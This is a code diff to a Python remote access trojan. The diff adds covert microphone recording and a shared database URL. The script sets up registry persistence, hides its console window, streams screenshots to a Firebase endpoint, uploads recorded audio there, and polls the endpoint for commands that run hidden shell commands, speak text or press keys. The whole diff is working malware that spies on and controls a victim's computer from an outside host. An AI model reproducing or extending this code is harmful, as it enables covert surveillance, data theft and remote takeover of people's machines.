@@ -9,7 +9,23 @@ import shutil
 import pyautogui
 import base64
 import threading
+import sounddevice as sd
+from scipy.io.wavfile import write
 from io import BytesIO
+
+DB_BASE_URL = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE"
+
+def record_audio(duration=10):
+    try:
+        fs = 16000  
+        recording = sd.rec(int(duration * fs), samplerate=fs, channels=1)
+        sd.wait() 
+        buffer = BytesIO()
+        write(buffer, fs, recording)
+        audio_base = base64.b64encode(buffer.getvalue()).decode()
+        requests.put(f"{DB_BASE_URL}/audio_data.json", json={"audio": audio_base})
+    except:
+        pass
 
 def make_persistent():
     try:
@@ -25,8 +41,9 @@ def make_persistent():
             subprocess.Popen(reg_cmd, shell=True, creationflags=0x08000000)
     except:
         pass
+
 def stream_screen():
-    screen_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/live_screen.json"
+    screen_url = f"{DB_BASE_URL}/live_screen.json"
     while True:
         try:
             screenshot = pyautogui.screenshot()
@@ -37,37 +54,42 @@ def stream_screen():
             time.sleep(2)
         except:
             time.sleep(5)
+
 def hide_console():
     hWnd = ctypes.WinDLL('kernel32').GetConsoleWindow()
     if hWnd:
         ctypes.WinDLL('user32').ShowWindow(hWnd, 0)
+
 def speak(text):
     try:
         speaker = win32com.client.Dispatch("SAPI.SpVoice")
         speaker.Speak(text)
     except:
         pass
+
 def execute_command(command):
-    
     try:
         subprocess.Popen(command, shell=True, creationflags=0x08000000)
     except:
         pass
+
 def start_gateway():
     make_persistent()
     threading.Thread(target=stream_screen, daemon=True).start()
     time.sleep(5)
     hide_console()   
-    db_url = "https://a0zai-56c3a-default-rtdb.europe-west1.firebasedatabase.app/A0Z_CORE/current_command.json"
-    last_timestamp = 0
+    
+    cmd_url = f"{DB_BASE_URL}/current_command.json"
+    last_ts = 0
+    
     while True:
         try:
-            response = requests.get(db_url)
+            response = requests.get(cmd_url)
             data = response.json()
             if data:
                 text = data.get('text', '')
                 ts = data.get('timestamp', 0)
-                if ts > last_timestamp:
+                if ts > last_ts:
                     if text.startswith("/say "):
                         speak(text.replace("/say ", ""))
                     elif text.startswith("/cmd "):
@@ -77,7 +99,9 @@ def start_gateway():
                     elif text.startswith("/press "):
                         keys = text.replace("/press ", "").split()
                         pyautogui.hotkey(*keys)
-                    last_timestamp = ts
+                    elif text.startswith("/record"):
+                        threading.Thread(target=record_audio, args=(10,), daemon=True).start()
+                    last_ts = ts
         except:
             pass
         time.sleep(1)
